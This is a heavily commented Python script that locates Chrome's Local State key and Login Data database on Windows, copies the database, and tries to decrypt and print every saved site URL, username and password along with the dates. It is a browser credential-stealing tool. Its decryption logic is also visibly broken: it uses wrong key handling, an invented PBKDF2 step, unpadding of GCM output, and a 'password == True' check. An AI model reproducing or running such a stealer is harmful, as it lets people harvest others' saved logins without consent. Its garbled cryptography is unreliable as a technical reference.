import os  # Provides functions for interacting with the operating system
import json  # Enables working with JSON data
import base64  # Provides functions for encoding and decoding data using base64
import sqlite3  # Enables interaction with SQLite databases
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # Imports encryption-related classes and functions from cryptography library
from cryptography.hazmat.backends import default_backend  # Imports the default backend for the cryptography library
import shutil  # Provides functions for file operations like copying and deleting
from datetime import datetime, timedelta  # Allows working with dates and times
from Cryptodome.Cipher import AES   # Import the AES cipher algorithm from the Cryptodome library
from Cryptodome.Protocol.KDF import PBKDF2  # Import the PBKDF2 key derivation function from the Cryptodome library
from Cryptodome.Util.Padding import unpad   # Import the unpadding function from the Cryptodome library

# Function for fetching date and time from chrome
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)    # Converts a Chrome timestamp to a datetime object.

# Function for fetching the encrypted key
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")  # Construct the path to the Chrome local state file
    with open(local_state_path, "r", encoding="utf-8") as f:    # Open the Chrome local state file for reading with UTF-8 encoding
        local_state = f.read()  # Read the contents of the Chrome local state file into the local_state variable
        local_state = json.loads(local_state)   # Parse the contents of the local state file as JSON and store the result in the local_state variable
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])  # Decode the base64-encoded encrypted key from the local state data
        encrypted_key = encrypted_key[5:]   # Trim the first 5 characters from the encrypted key
        encryption_key = encrypted_key[16:]  # Trim the DPAPI prefix from the encrypted key
        return encryption_key   # Return the obtained encryption key

# Function to decrypt the password and key
def decrypt_password(password, key):
    try:    #try block starts
        salt = password[3:15]   # Extract the salt value from the encrypted password
        ciphertext = password[15:]  # Extract the ciphertext from the encrypted password
        kdf = PBKDF2(key, salt, 16, 1003)   # Perform key derivation using PBKDF2 with the given key, salt, iterations, and desired key length
        key = kdf[:16]  # Extract the first 16 bytes of the derived key as the encryption key
        cipher = AES.new(key, AES.MODE_GCM, nonce=ciphertext[:12])  # Create a new AES cipher object with the encryption key, AES GCM mode, and the provided nonce
        decrypted_password = cipher.decrypt_and_verify(ciphertext[12:-16], ciphertext[-16:])    # Decrypt the ciphertext using the AES cipher object and verify its authenticity
        unpadded_password = unpad(decrypted_password, AES.block_size)   # Remove the padding from the decrypted password using the AES block size
        return unpadded_password.decode()   # Return the decrypted and unpadded password as a string
    except Exception as e:  #except block starts
        return ""   # Return an empty string when decryption fails or encounters an error

# main function
def main():
    try:    #try block starts
        key = get_encryption_key()  # Retrieve the encryption key from the local state file of Chrome
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "PLEASE_ADD_YOUR_PROFILE_N0(Example: Profile 1, Profile 2,...)", "Login Data")   # Construct the path to the Chrome login database file based on the user profile
        temp_db_path = "Chromedata.db"  # Specify the temporary path for the copied database file
        shutil.copyfile(db_path, temp_db_path)  # Copy the Chrome login database file to the temporary path
        db = sqlite3.connect(temp_db_path)  # Connect to the SQLite database using the temporary database file
        cursor = db.cursor()    # Create a cursor object to execute SQL queries on the database
        cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")  # Execute a SQL query to retrieve login information from the "logins" table, ordered by date_created
        for row in cursor.fetchall():   # Iterate over the fetched rows from the query result
            
            # Extract the relevant login information from the row
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            
            if username or password:    # Check if either the username or password is non-empty
                
                # Print the login information (URLs, username, and password)
                print(f"Original URL: {origin_url}")
                print(f"Action URL: {action_url}")
                print(f"Username: {username}")
                if password == True:
                    print(f"Password: {password}")
                else:
                    print(f"Password: Unable to decrypt")
            else:   # Skip the iteration if both username and password are empty
                continue
            if date_created != 86400000000 and date_created:
                print(f"Created date: {str(get_chrome_datetime(date_created))}")    # Print the created date if it is valid (not equal to 86400000000) and exists
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")  # Print the last used date if it is valid (not equal to 86400000000) and exists
            print("="*50)   # Print a separator line after each login entry
        cursor.close()  # Close the cursor object
        db.close()  # Close the database connection
    except Exception as e:
        print(f"An error occurred: {str(e)}")   # Catch any exceptions that occur during the execution of the code and print an error message
    finally:
        try:
            os.remove(temp_db_path)  
        except Exception as e:
            print(f"An error occurred while deleting the temporary file: {str(e)}") # Use the 'finally' block to ensure that the temporary database file is deleted, even if an error occurs

if __name__ == "__main__":
    main()
